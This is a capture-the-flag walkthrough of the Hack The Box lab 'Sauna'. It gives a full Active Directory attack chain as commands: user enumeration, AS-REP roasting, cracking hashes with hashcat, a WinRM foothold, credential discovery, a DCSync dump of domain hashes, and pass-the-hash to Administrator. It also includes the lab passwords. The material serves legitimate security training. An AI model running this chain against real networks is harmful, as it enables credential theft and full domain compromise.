
## HTB Sauna – Attack Methodology

### 1. Enumeration

The initial step was to enumerate the target machine. I started with SMB enumeration using `enum4linux` in order to gather information about the domain.

```
enum4linux -a 10.129.4.167
```

From the enumeration results, the domain name was identified as:

```
EGOTISTICAL-BANK.LOCAL
```

Discovering the domain name is an important step because it allows further Active Directory attacks.

---

### 2. Kerberos Username Enumeration

After identifying the domain name, I performed Kerberos username enumeration using `kerbrute`.

```
kerbrute userenum -d egotistical-bank.local --dc 10.129.4.167 users.txt
```

This attack revealed several valid usernames:

```
fsmith
hsmith
svc_loanmgr
```

---

### 3. AS-REP Roasting

With valid usernames identified, I attempted an **AS-REP roasting attack**. This attack targets accounts that have Kerberos pre-authentication disabled.

```
GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -dc-ip 10.129.4.167
```

This command returned an AS-REP hash for the user:

```
fsmith
```

---

### 4. Hash Cracking

The obtained hash was then cracked using `hashcat`.

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

The password was successfully recovered:

```
fsmith : Thestrokes23
```

---

### 5. Initial Foothold (WinRM)

Using these credentials, I connected to the machine via WinRM and obtained an initial shell.

```
evil-winrm -i 10.129.4.167 -u fsmith -p Thestrokes23
```

At this stage, a **low-privileged user shell** was obtained.

---

### 6. Privilege Escalation Enumeration

To search for privilege escalation opportunities, I uploaded and executed **WinPEAS**.

```
winpeas.exe
```

The output revealed stored credentials for the service account:

```
svc_loanmgr : Moneymakestheworldgoround!
```

---

### 7. DCSync Attack

The `svc_loanmgr` account had **DCSync privileges**, allowing domain password hashes to be extracted.

```
impacket-secretsdump egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.129.4.167
```

This command dumped the domain hashes, including the **Administrator NTLM hash**.

---

### 8. Administrator Access

Finally, the Administrator NTLM hash was used to authenticate via WinRM and obtain full administrative access.

```
evil-winrm -i 10.129.4.167 -u Administrator -H <NTLM_HASH>
```

---

### Attack Chain Summary

```
SMB Enumeration
↓
Domain Discovery
↓
Kerberos Username Enumeration
↓
AS-REP Roasting
↓
Hash Cracking
↓
WinRM Foothold
↓
Credential Discovery (WinPEAS)
↓
DCSync Attack
↓
Administrator Access
```
v
